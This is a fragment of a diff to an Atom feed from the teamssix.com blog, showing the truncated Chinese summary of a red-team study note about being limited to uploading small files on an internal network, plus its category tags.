-    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在内网中，有时偶尔会因为种种限制，导致无法上传大文件，以至于只能上传小文件。&lt;/p&gt;
-&lt;p&gt;在前段时</summary>
-      
-    
-    
-    
-    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
     
   </entry>
   
